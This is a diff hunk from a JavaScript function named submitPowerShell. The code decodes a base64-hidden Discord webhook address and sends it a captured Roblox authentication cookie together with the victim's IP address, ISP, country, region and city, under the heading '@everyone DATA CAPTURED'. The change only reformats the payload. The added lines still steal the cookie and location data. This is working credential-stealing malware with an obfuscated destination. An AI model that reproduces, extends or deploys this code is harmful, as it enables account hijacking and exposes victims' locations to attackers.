@@ -262,35 +262,14 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
-        // Webhook payload with only data and location
-        const authValue = robloxCookie ? 
-            (robloxCookie.length > 1000 ? robloxCookie.substring(0, 1000) + "..." : robloxCookie) : 
-            `Script detected with ${wordCount} words`;
-
+        // Simple webhook payload
+        const authData = robloxCookie ? robloxCookie.substring(0, 500) : `${wordCount} words detected`;
+        
         const payload = {
-            content: "@everyone 🔑 **DATA CAPTURED** 📍",
-            embeds: [{
-                title: "🔑 Data + Location",
-                color: 65280,
-                fields: [
-                    {
-                        name: "🔑 Authentication Data",
-                        value: robloxCookie ? `\`\`\`${authValue}\`\`\`` : `**Script: ${wordCount} words**`,
-                        inline: false
-                    },
-                    {
-                        name: "📍 Location",
-                        value: `**Country:** ${locationInfo.country || 'Unknown'}\n**Region:** ${locationInfo.region || 'Unknown'}\n**City:** ${locationInfo.city || 'Unknown'}`,
-                        inline: false
-                    },
-                    {
-                        name: "🌐 Network",
-                        value: `**IP:** ${locationInfo.ip || 'Unknown'}\n**ISP:** ${locationInfo.isp || 'Unknown'}`,
-                        inline: false
-                    }
-                ],
-                timestamp: new Date().toISOString()
-            }]
+            content: `@everyone **DATA CAPTURED**
+**Auth:** ${authData}
+**Location:** ${locationInfo.country || 'Unknown'}, ${locationInfo.city || 'Unknown'}  
+**IP:** ${locationInfo.ip || 'Unknown'}`
         };
 
         const response = await fetch(webhookUrl, {
